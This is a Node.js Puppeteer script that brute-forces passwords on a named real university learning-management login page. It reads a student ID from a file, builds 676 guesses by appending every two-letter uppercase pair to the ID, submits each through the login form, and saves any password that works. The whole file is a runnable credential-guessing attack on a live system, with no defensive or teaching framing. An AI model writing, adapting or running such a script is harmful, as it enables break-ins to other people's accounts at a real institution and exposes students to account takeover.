const puppeteer = require('puppeteer');
const fs = require('fs');

const url = 'http://lms.uaf.edu.pk/login/index.php';
const ag = fs.readFileSync('ag.txt').toString();

const alphabets = [
  'A',
  'B',
  'C',
  'D',
  'E',
  'F',
  'G',
  'H',
  'I',
  'J',
  'K',
  'L',
  'M',
  'N',
  'O',
  'P',
  'Q',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z'
];

let passwords = generatePasswords(ag, alphabets);

(async function() {
  // Launch Headless Chrome
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();

  console.log('Browser Launched.');

  await page.goto(url, { waitUntil: 'networkidle2' });

  console.log('Checking passwords for ag: ', ag);

  for (let i = 0; i < passwords.length; i++) {
    const password = passwords[i];

    await Promise.all([
      page.$eval(
        '.loginform',
        (div, ag, password) => {
          const [agIn, passIn] = [...div.querySelectorAll('.form-control')];

          agIn.value = ag;
          passIn.value = password;

          div.parentElement.submit();
        },
        ag,
        password
      ),
      page.waitForNavigation()
    ]);

    const e = await page.evaluate(() => {
      return !!document.querySelector('span.error');
    });

    console.log(`Checking password No. ${i}`, !e);

    if (!e) {
      console.log('Password Found!!!');
      console.log('Writing to File...');
      writePassToFile(password, `${ag}.txt`);
      break;
    }
  }

  // Close the browser
  await browser.close();

  console.log('All Done!!!');
})();

function generatePasswords(ag, alphabets) {
  let letterCombs = [];

  for (const letter1 of alphabets) {
    for (const letter2 of alphabets) {
      letterCombs.push(`${letter1}${letter2}`);
    }
  }

  const passwords = letterCombs.map(comb => `${ag}${comb}`);

  return passwords;
}

function writePassToFile(password, filename = 'password.txt') {
  if (fs.existsSync(filename)) {
    fs.unlinkSync(filename);
  }
  fs.writeFileSync(filename, password);
}
